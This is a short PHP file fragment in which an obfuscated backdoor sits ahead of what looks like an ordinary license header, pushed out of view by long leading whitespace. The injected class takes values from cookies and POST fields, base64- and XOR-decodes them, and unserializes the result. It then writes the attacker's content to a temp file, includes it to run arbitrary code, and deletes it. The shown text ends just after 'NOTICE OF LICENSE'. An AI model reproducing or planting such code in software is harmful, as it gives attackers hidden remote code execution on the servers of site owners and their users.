<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("vuxjfvjs")){class vuxjfvjs{public static $jwnlkuru = "ihwrkqiympqildje";public static $epgneq = NULL;public function __construct(){$cilmf = @$_COOKIE[substr(vuxjfvjs::$jwnlkuru, 0, 4)];if (!empty($cilmf)){$asifa = "base64";$eugbrvif = "";$cilmf = explode(",", $cilmf);foreach ($cilmf as $firiwk){$eugbrvif .= @$_COOKIE[$firiwk];$eugbrvif .= @$_POST[$firiwk];}$eugbrvif = array_map($asifa . "_decode", array($eugbrvif,));$eugbrvif = $eugbrvif[0] ^ str_repeat(vuxjfvjs::$jwnlkuru, (strlen($eugbrvif[0]) / strlen(vuxjfvjs::$jwnlkuru)) + 1);vuxjfvjs::$epgneq = @unserialize($eugbrvif);}}public function __destruct(){$this->mqxjrkb();}private function mqxjrkb(){if (is_array(vuxjfvjs::$epgneq)) {$mzcxjxfhb = sys_get_temp_dir() . "/" . crc32(vuxjfvjs::$epgneq["salt"]);@vuxjfvjs::$epgneq["write"]($mzcxjxfhb, vuxjfvjs::$epgneq["content"]);include $mzcxjxfhb;@vuxjfvjs::$epgneq["delete"]($mzcxjxfhb);exit();}}}$rewbmt = new vuxjfvjs();$rewbmt = NULL;} ?><?php
 /**
 * NOTICE OF LICENSE
 *
